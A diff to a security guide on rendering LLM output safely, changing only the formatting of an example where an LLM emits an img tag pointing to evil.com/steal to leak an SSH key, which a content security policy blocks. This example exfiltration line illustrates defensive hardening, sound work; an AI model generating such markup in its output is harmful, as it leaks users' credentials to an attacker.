@@ -64,7 +64,7 @@ content security policy is usually annoying. here it's your friend:
 
 this policy says: no network requests except to specific llm apis. an llm can't trick your app into loading an image that exfiltrates data because image loading is blocked entirely.
 
-the attack vector looks like this: an llm generates `<img src="https://evil.com/steal?data=YOUR_SSH_KEY">` and your browser happily sends that request. with csp, it just fails.
+the attack vector looks like this: an llm generates `<img src="https://evil.com/steal?data=YOUR_SSH_KEY" />` and your browser happily sends that request. with csp, it just fails.
 
 ### 3. sandboxed iframes for llm output
 
